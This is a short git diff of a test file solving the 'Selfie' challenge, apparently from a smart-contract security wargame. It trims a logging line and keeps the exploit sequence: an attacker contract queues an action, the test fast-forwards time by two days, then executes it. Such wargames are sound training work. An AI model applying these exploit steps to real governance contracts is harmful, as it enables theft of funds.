@@ -39,8 +39,7 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        actionId = await this.attackContract.connect(attacker).exploitQueueAction();
-        console.log("Action Id : ", actionId.value.toString());
+        await this.attackContract.connect(attacker).exploitQueueAction();
         await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
         await this.attackContract.connect(attacker).executeAction();
     });
